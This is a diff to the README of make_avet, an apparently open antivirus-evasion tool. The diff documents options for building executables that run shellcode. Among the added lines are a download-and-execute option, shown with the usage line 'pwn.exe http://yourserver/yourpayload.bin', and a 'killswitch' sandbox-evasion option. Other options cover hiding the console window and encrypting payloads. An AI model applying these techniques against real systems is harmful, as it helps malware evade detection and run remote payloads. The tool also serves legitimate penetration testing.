@@ -36,15 +36,19 @@ The purpose of make_avet is to preconfigure a definition file (defs.h) so that t
 
 Let's have a look at the options from make_avet, examples will be given below:
 ```
--l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.txt
+-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.bin
+   when called with -E call with mytrojan.exe shellcode.txt
 -f compile shellcode into .exe, needs filename of shellcode file
 -u load and exec shellcode from url using internet explorer (url is compiled into executable)
+-d download a raw shellcode via http in memory and exec (no overhead, use socket)
+   usage example: pwn.exe http://yourserver/yourpayload.bin
 -E use avets ASCII encryption, often do not has to be used
-   Note: with -l -E is mandatory 
+   Can be used with -l
 -F use fopen sandbox evasion
+-k "killswitch" sandbox evasion with gethostbyname
 -X compile for 64 bit
 -p print debug information
--q quiet mode (hide windows)
+-q quiet mode (hide console window)
 -h help
 ```
 
